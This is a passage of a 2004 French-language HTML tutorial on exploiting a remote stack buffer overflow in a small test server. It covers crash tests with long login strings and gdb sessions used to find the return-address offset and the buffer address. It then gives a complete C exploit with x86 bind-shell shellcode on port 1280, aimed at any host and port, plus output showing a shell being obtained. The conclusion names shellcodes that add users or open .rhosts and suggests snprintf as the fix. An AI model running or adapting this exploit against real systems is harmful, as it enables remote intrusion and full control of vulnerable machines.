+  <p align="left"><u><em><font size="2"></font></em></u></p>
+  <p align="left"><font size="2"><em><u>Le server marche. On va maintenant essayer 
+    d'entrer 'un plus grand' login :</u></em></font></p>
+  <table width="27%" border="1" align="left" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">viriiz@null:~/RemoteBOF$ 
+          ./vuln</font></div></td>
+    </tr>
+  </table>
+  <p align="left"><u><em><font size="2"></font></em></u></p>
+  <p align="left">&nbsp;</p>
+  <p align="left"><font size="2"><em><u><br>On ouvre un autre terminal :</u></em></font></p>
+  <table width="77%" border="1" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">viriiz@null:~/RemoteBOF$ 
+        telnet 127.0.0.1 4000<br>
+        Trying 127.0.0.1...<br>
+        Connected to 127.0.0.1.<br>
+        Escape character is '^]'.<br>
+        login:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        ...<br>
+        Connection closed by foreign host.</font></td>
+    </tr>
+  </table>
+  <p align="left"><u><em><font size="2"></font></em></u></p>
+  <p align="left"><em><u><font size="2"><br>On revient sur l'autre terminal et on 
+    observe :</font></u></em></p>
+  <table width="28%" border="1" align="left" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><div align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">viriiz@null:~/RemoteBOF$ 
+          ./vuln <br>
+          Segmentation fault</font></div></td>
+    </tr>
+  </table>
+  <p align="left"><u><em><font size="2"><br></font></em></u></p>
+  <p align="left">&nbsp;</p>
+  <p align="left"><font size="2">Notre mini server a 'segfault&eacute;' ;).</font></p>
+  <p align="left"><u><em><font size="2"><br>On relance le mini server mais cette fois 
+    ci avec <strong>gdb</strong> (<strong>G</strong>nu <strong>D</strong>e<strong>B</strong>ugger) 
+    :</font></em></u></p>
+  <table width="38%" border="1" align="left" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">viriiz@null:~/RemoteBOF$ 
+        gdb vuln -q<br>
+        (gdb) run<br>
+        Starting program: /home/viriiz/RemoteBOF/vuln </font></td>
+    </tr>
+  </table>
+  <p align="left"><u><em><font size="2"></font></em></u></p>
+  <p align="left">&nbsp;</p>
+  <p align="left">&nbsp;</p>
+  <p align="left"><font size="2"><em><u><br><br>On ouvre un terminal et on fait comme 
+    tout &agrave; l'heure</u></em></font><u> :</u></p>
+  <table width="81%" border="1" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">viriiz@null:~/RemoteBOF$ 
+        telnet 127.0.0.1 4000<br>
+        Trying 127.0.0.1...<br>
+        Connected to 127.0.0.1.<br>
+        Escape character is '^]'.<br>
+        login:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        A...<br>
+        Connection closed by foreign host.</font></td>
+    </tr>
+  </table>
+  <p align="left">&nbsp;</p>
+  <p align="left"><font size="2"><em><u><br>On jette un coup d'oeil sur l'autre terminal 
+    ( celui avec gdb lanc&eacute; ) :</u></em></font></p>
+  <table width="60%" border="1" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"> 
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">viriiz@null:~/RemoteBOF$ 
+          gdb -q vuln<br>
+          (gdb) run<br>
+          Starting program: /home/viriiz/RemoteBOF/vuln </font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">Program received 
+          signal SIGSEGV, Segmentation fault.<br>
+          0x41414141 in ?? ()<br>
+          (gdb)</font></p>
+  </td>
+    </tr>
+  </table>
+  <p align="left"><u><em><font size="2"></font></em></u></p>
+  <p align="left"><font size="2">On remarque ici que le programme quite avec le 
+    signal <em>SIGSERV</em>, l'adresse de retour (<font color="#666666" face="Courier New, Courier, mono">%eip</font>) 
+    a &eacute;t&eacute; <em>overwritt&eacute;</em> par nos '<font color="#666666" face="Courier New, Courier, mono">A</font>' 
+    (41 en <em>ASCII</em>). En effet comme la taille de <em>buffer</em> est plus 
+    petite que celle de <em>name</em> lorsque l'on remplit &agrave; 'fond' le 
+    tableau <em>name</em>, lors du <em>sprinf</em>, on copie le contenu de<br>
+    <em>name</em> dans buffer, on a alors un <u>depassement de tampon</u>, les 
+    registres qui suivent le buffer sont ainsi '&eacute;cras&eacute;es'.</font></p>
+  <p align="left"><font size="2">Pour pouvoir exploiter ce <em>buffer overflow</em>, 
+    il faut determiner pr&eacute;cisement le nombre de '<font color="#666666" face="Courier New, Courier, mono">A</font>' 
+    qu'il faut inscrire pour <em>overwritter</em> l'adresse de retour et l'adresse 
+    ou 'demarre' le <em>buffer</em> pour pouvoir<em> overwritter l'eip</em> avec 
+    cette adresse. Pour cela on peut desassembler le mini server et on regarde 
+    combien d'octets sont alou&eacute;s au <em>buffer</em> ou on peut faire un 
+    prog qui va essayer toutes les valeurs possibles de A pour arriver au '<em>segfault</em>'.</font></p>
+  <p align="left"><font size="2">Nous on va d&eacute;sassembler le mini server 
+    et rechercher l'espace alou&eacute; au <em>buffer</em>. On desassemble la 
+    fonction <font color="#666666" face="Courier New, Courier, mono">sendstring</font> 
+    et on remarque un &quot;<font color="#666666" face="Courier New, Courier, mono">sub 
+    $0x5f8,%esp</font>&quot; ce qui veut dire que pour les 2 tableaux ( <em>name</em> 
+    et <em>buffer</em> ) on aloue pr&eacute;cisement <font color="#000000">1528 
+    octets</font>. Le probl&egrave;me c'est que nous on veut savoir combien d'espace 
+    est alou&eacute; pour <em>buffer</em> uniquement. Dans ce cas l&agrave; je 
+    ne vois qu'une solution, c'est de faire des tests. On a un petit indice c'est 
+    que la valeur va tourner autour de<font color="#FF0000"> 510</font>.</font></p>
+  <p align="left"><font size="2"><em><u><br>On va essayer 514+4+4, on lance le mini 
+    server avec <strong>gdb</strong> sur un terminal et sur un autre on fait :</u></em></font></p>
+  <table width="81%" border="1" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">viriiz@null:~/RemoteBOF$ 
+        perl -e &quot;print 'A'x518; printf'BBBB'&quot;<br>
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        AAAAAAAAAAAAAAAAAAAAAABBBB<br>
+        viriiz@null:~/RemoteBOF$ telnet 127.0.0.1 4000<br>
+        Trying 127.0.0.1...<br>
+        Connected to 127.0.0.1.<br>
+        Escape character is '^]'.<br>
+        login:<br>
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+        AAAAAAAAAAAAAAAAAAAABBBB</font></td>
+    </tr>
+  </table>
+  <p align="left"><u><em><font size="2"></font></em></u></p>
+  <p align="left"><font size="2"><em><u><br>On va voir sur l'autre terminal ( celui 
+    avec gdb ) :</u></em></font></p>
+  <table width="43%" border="1" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">Program 
+        received signal SIGSEGV, Segmentation fault<br>
+        0x42424242 in ?? ()</font></td>
+    </tr>
+  </table>
+  <p align="left"><font size="2">Bingo! <font color="#666666" face="Courier New, Courier, mono">0x42424242</font> 
+    correspond &agrave; notre chaine '<font color="#666666" face="Courier New, Courier, mono">BBBB</font>' 
+    ! On sait alors que l'espace alou&eacute; au <em>buffer</em> est de <font color="#FF0000">514</font> 
+    octets.<br>
+    Il ne nous reste plus qu'&agrave; conna&icirc;tre l'adresse de d&eacute;but 
+    du <em>buffer</em>. On va reprendre <strong>gdb</strong> o&ugrave; il est 
+    s'est arr&ecirc;t&eacute; c'est &agrave; dire apr&egrave;s '<font color="#666666" face="Courier New, Courier, mono">0x42424242 
+    in ??()</font>':</font></p>
+  <table width="43%" border="1" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">(gdb) 
+        x/200bx $esp-200<br>
+        0xbffff9c8: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41<br>
+        0xbffff9d0: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41<br>
+        0xbffff9d8: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41<br>
+        0xbffff9e0: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41<br>
+        0xbffff9e8: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41<br>
+        0xbffff9f0: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41<br>
+        0xbffff9f8: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41<br>
+        0xbffffa00: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41<br>
+        0xbffffa08: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41<br>
+        0xbffffa10: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41<br>
+        0xbffffa18: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41<br>
+        0xbffffa20: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41<br>
+        0xbffffa28: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41<br>
+        ...</font></td>
+    </tr>
+  </table>
+  <p align="left"><font size="2"></font></p>
+  <p align="left"><font size="2">Tous nos '<font color="#666666" face="Courier New, Courier, mono">A</font>' 
+    sont l&agrave; . On prend donc une des premi&egrave;res adresses par exemple 
+    <font color="#666666" face="Courier New, Courier, mono">0xbffff9e0</font>.</font></p>
+  <p align="left"><font size="2">Maintenant nous avons tout pour &eacute;crire 
+    notre exploit !</font></p>
+  <p align="left"><font size="2"><em><u><br>Voici le code, je l'explique apr&egrave;s 
+    :</u></em></font></p>
+  <table width="82%" border="1" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"> 
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">#include 
+          &lt;stdio.h&gt;<br>
+          #include &lt;netdb.h&gt;<br>
+          #include &lt;netinet/in.h&gt;<br>
+          #define OFFSET 522 /* buffer + %ebp + %eip = 514 + 4 + 4 = 522 */</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">/* shellcode - 
+          bind a shell on port 1280 + bits to cram (nop) + RET<br>
+          \xe0\xf9\xff\xbf */</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">char shellcode_ret[] 
+          =<br>
+          &quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\xb1\x06\x51\xb1\x01&quot;<br>
+          &quot;\x51\xb1\x02\x51\x8d\x0c\x24\xcd\x80\xb3\x02\xb1\x02\x31\xc9\x51\x51\x51&quot;<br>
+          &quot;\x80\xc1\x05\x66\x51\xb1\x02\x66\x51\x8d\x0c\x24\xb2\x10\x52\x51\x50\x8d&quot;<br>
+          &quot;\x0c\x24\x89\xc2\x31\xc0\xb0\x66\xcd\x80\xb3\x01\x53\x52\x8d\x0c\x24\x31&quot;<br>
+          &quot;\xc0\xb0\x66\x80\xc3\x03\xcd\x80\x31\xc0\x50\x50\x52\x8d\x0c\x24\xb3\x05&quot;<br>
+          &quot;\xb0\x66\xcd\x80\x89\xc3\x31\xc9\x31\xc0\xb0\x3f\xcd\x80\x41\x31\xc0\xb0&quot;<br>
+          &quot;\x3f\xcd\x80\x41\x31\xc0\xb0\x3f\xcd\x80\xeb\x18\x5e\x89\x75\x08\x31\xc0&quot;<br>
+          &quot;\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08\x8d\x55\x0c\xcd\x80&quot;<br>
+          &quot;\xe8\xe3\xff\xff\xff/bin/sh\x90\x90\x90\x90\xe0\xf9\xff\xbf&quot;;</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">int main(int argc, 
+          char *argv[]) {<br>
+          char buffer[OFFSET]; /* buffer a remplir */<br>
+          int s, i, size;<br>
+          struct sockaddr_in yeah;<br>
+          struct hostent *host;</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">if(argc != 3) 
+          {<br>
+          puts(&quot;[~] Remote buffer overflow&quot;;<br>
+          printf(&quot;[~] Usage: %s host port\n&quot;, argv[0]);<br>
+          return -1;<br>
+          }</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">for(i=0;i&lt;(OFFSET-sizeof(shellcode_ret));i++) 
+          buffer[i] = 0x90; /* on place les NOPs dans buffer */</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">memcpy(buffer+OFFSET-sizeof(shellcode_ret) 
+          , shellcode_ret,<br>
+          sizeof(shellcode_ret)); /* on copie le shellcode dans le buffer */</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">host=gethostbyname(argv[1]); 
+          /* on test l'host */</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">if (host==NULL)<br>
+          {<br>
+          fprintf(stderr, &quot;[!] Gethostbyname failled\n&quot;;<br>
+          return -1;<br>
+          }</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">s = socket(AF_INET, 
+          SOCK_STREAM, 0); /* on cr&eacute;e la socket */</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">if (s &lt; 0)<br>
+          {<br>
+          fprintf(stderr, &quot;[!] Erreur lors de la cr&eacute;ation de la socket\n&quot;;<br>
+          return -1;<br>
+          }</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">/* informations 
+          pour la connexion */<br>
+          yeah.sin_family = AF_INET;<br>
+          yeah.sin_addr = *((struct in_addr *)host-&gt;h_addr);<br>
+          yeah.sin_port = htons(atoi(argv[2]));</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">if (connect(s, 
+          (struct sockaddr *)&amp;yeah, sizeof(yeah))==-1) /* on se connect */<br>
+          {<br>
+          close(s);<br>
+          fprintf(stderr, &quot;[!] Erreur lors de la tentative de connexion\n&quot;;<br>
+          return -1;<br>
+          }</font></p>
+        <p align="left"><font color="#666666" size="2" face="Courier New, Courier, mono">size = send(s, 
+          buffer, sizeof(buffer), 0); /* on envoi le buffer */<br>
+          if (size==-1)<br>
+          {<br>
+          close(s);<br>
+          fprintf(stderr, &quot;[!] Foo! Exploit failled \n&quot;;<br>
+          return -1;<br>
+          }else{<br>
+          fprintf(stdout, &quot;[!] Exploit success! telnet %s 1280 !\n&quot;,argv[1]);<br>
+          }<br>
+          close(s); /* on ferme la socket */<br>
+          }</font></p>
+  </td>
+    </tr>
+  </table>
+  <p align="left"><u><em><font size="2"></font></em></u></p>
+  <p align="left"> <font size="4">L</font><font size="2">e code est assez simple, 
+    on d&eacute;fini la valeur de l'<em>OFFSET</em> ( la taille r&eacute;elle 
+    du <em>buffer</em> + 4 octets pour <font color="#666666" face="Courier New, Courier, mono">%ebp</font> 
+    + 4 octets pour <font color="#666666" face="Courier New, Courier, mono">%eip</font>), 
+    on d&eacute;clare ensuite le <em>shellcode</em>, moi ici j'ai rajout&eacute; 
+    l'adresse de retour (<font color="#666666" face="Courier New, Courier, mono">0xbffff9e0</font>) 
+    &agrave; la fin du <em>shellcode</em> parce que ca permet d'&eacute;viter 
+    3 lignes de code en plus (oui je suis un fain&eacute;ant). On d&eacute;clare 
+    le <em>buffer</em> de taille [OFFSET] et des variables et une structure pour 
+    les <em>sockets</em> et les boucles. Ensuite on place les <strong><em>NOP</em></strong><em>s</em> 
+    (<font color="#666666" face="Courier New, Courier, mono">0x90</font>) au d&eacute;but 
+    du <em>buffer</em> gr&acirc;ce &agrave; une <font color="#666666" face="Courier New, Courier, mono">boucle 
+    for</font>. J'aurai pu &eacute;galement utilis&eacute; <font color="#666666" face="Courier New, Courier, mono">memset()</font> 
+    aussi. Ensuite on place le <em>shellcode</em> et on l'arr&ecirc;te &agrave; 
+    la fin de <em>buffer</em> (<font color="#666666" face="Courier New, Courier, mono">OFFSET-sizeof(shellcode_ret)</font>) 
+    avec la fonction <font color="#666666" face="Courier New, Courier, mono">memcpy()</font>, 
+    on aurai pu &eacute;galement faire une boucle comme pr&eacute;c&eacute;dement. 
+    On initialise ensuite la connexion, et on envoie le <font color="#666666" face="Courier New, Courier, mono">buffer</font>. 
+    Maintenant on va tester &ccedil;a :</font></p>
+  <table width="60%" border="1" bordercolor="#000000">
+    <tr>
+      <td height="124" bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">viriiz@null:~/RemoteBOF$ 
+        gcc -o exploit exploit.c<br>
+        viriiz@null:~/RemoteBOF$ ./vuln &amp;<br>
+        viriiz@null:~/RemoteBOF$ ./exploit 127.0.0.1 4000<br>
+        [!] Exploit success! telnet 127.0.0.1 1280 !<br>
+        viriiz@null:~/RemoteBOF$ telnet 127.0.0.1 1280<br>
+        Trying 127.0.0.1...<br>
+        Connected to 127.0.0.1.<br>
+        Escape character is '^]'.<br>
+        uname -a;<br>
+        Linux null 2.4.26 #1 SMP mer avr 21 09:40:45 CEST 2004 i686 GNU/Linux</font></td>
+    </tr>
+  </table>
+  <p align="left"><font size="2">C'est bon ca marche !</font></p>
+  <p align="left"><br>
+  </p>
+  <p align="left">&nbsp;</p>
+  <p align="left"><u><font size="2"><strong><a name="6"></a>6) Conclusion</strong></font></u></p>
+  <p align="left"> <font size="2">Voil&agrave; c'est finit, j'esp&egrave;re ne 
+    pas dis avoir trop de betises . Ici le buffer &eacute;tait assez grand pour 
+    y mettre notre <em>shellcode</em> qui <em>bind</em> un <em>shell</em>. Si 
+    le buffer aurait &eacute;t&eacute; plus petit, on aurait pu faire un <em>shellcode</em> 
+    avec une fonction 'originale' plus petit comme par exemple un <em>shellcode</em> 
+    qui rajoute un <em>user</em> ou qui rajoute '+ +' au fichier <font color="#666666" face="Courier New, Courier, mono">.rhosts</font>. 
+    Pour 's&eacute;curiser' le mini server, il aurait fallu utiliser la fonction 
+    <font color="#666666" face="Courier New, Courier, mono">snprintf</font> &agrave; 
+    la place de <font color="#666666" face="Courier New, Courier, mono">sprintf</font>, 
+    cette fonction permet de controler le nombre maximum de caract&egrave;res 
+    &agrave; &eacute;crire dans le <em>buffer</em>.</font></p>
+  <p align="left"><font size="2"><em><u>Syntaxe:</u></em></font></p>
+  <table width="52%" border="1" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">int 
+          snprintf ( char *str, size_t n,const char *format, ... ); </font></div></td>
+    </tr>
+  </table>
+  <p align="left"><br>
+  </p>
+  <p align="left"><font size="2"><em><u>Dans notre code, on aurait du mettre:</u></em></font></p>
+  <table width="73%" border="1" bordercolor="#000000">
+    <tr>
+      <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">snprintf(buffer, 
+        sizeof(buffer)-1, &quot;\nHello %s ! Welcome to my server !\r\n&quot;,name);<br>
+        buffer[sizeof(buffer)]='\0';</font></td>
+    </tr>
+  </table>
+  <p align="left">&nbsp;</p>
+  <p align="left">&nbsp;</p>
+  <p align="left"><br>
+    <u><font size="2"><strong><a name="7"></a>7) R&eacute;f&eacute;rences</strong></font></u></p>
+  <p align="left"> <font color="#FF0000">[1]</font> Aleph1'Smash the Stack for 
+    Fun and Profit' Phrack #49-0x0e<br>
+    <font color="#FF0000">[2]</font> Nostrobo 'Exploitation Avanc&eacute;e de 
+    Stack Overflow Vulnerabilities'<br>
+    <font color="#FF0000">[3]</font> Nocte 'Fun and Games with evoluates shellcodes', 
+    TDC Mag n&deg;4<br>
+    <font color="#FF0000">[4]</font> rix 'Writing ia32 alphanumeric shellcodes', 
+    Phrack 54-0x0f<br>
+  </p>
+  <p align="left">&nbsp;</p>
+  <p align="right"><em><font size="3" face="Lucida Console">BY VIRIIZ</font></em> 
+  </p>
+  <p align="right"><font size="1" face="Verdana, Arial, Helvetica, sans-serif">Copyright 
+    &copy; 2004 ARENHACK - DHS</font></p>
+  <p align="center"><strong><a href="rbof.htm"><u>HAUT DE PAGE</u></a></strong></p>
+</div>
+</body>
+</html>
